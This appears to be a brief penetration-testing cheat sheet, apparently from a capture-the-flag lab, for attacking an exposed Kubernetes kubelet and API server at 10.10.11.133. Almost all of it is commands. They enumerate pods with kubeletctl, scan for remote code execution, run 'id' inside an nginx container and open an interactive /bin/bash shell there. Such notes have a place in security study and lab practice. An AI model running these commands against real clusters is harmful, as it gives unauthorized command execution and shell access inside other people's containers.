_____

https://kubernetes.io/docs/reference/ports-and-protocols/

A portable, extensible, open-source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. It has a large, rapidly growing ecosystem. Kubernetes services, support, and tools are widely available.

https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-basics

https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/

```bash
   curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

https://github.com/cyberark/kubeletctl
# API Minikube - TCP 8443

```bash
./kubectl --server https://10.10.11.133:8443  get pod
```

https://github.com/cyberark/kubeletctl

```bash
kubeletctl pods -s 10.10.11.133
```

```bash
kubeletctl runningpods -s 10.10.11.133  
```

```bash
kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
```

## run commands on the containers

```bash
kubeletectl -s 10.10.11.133 scan rce
```

Name of the pod (nginx) and the name of the container (nginx)
```bash
kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx
```

## shell

```bash
kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
```
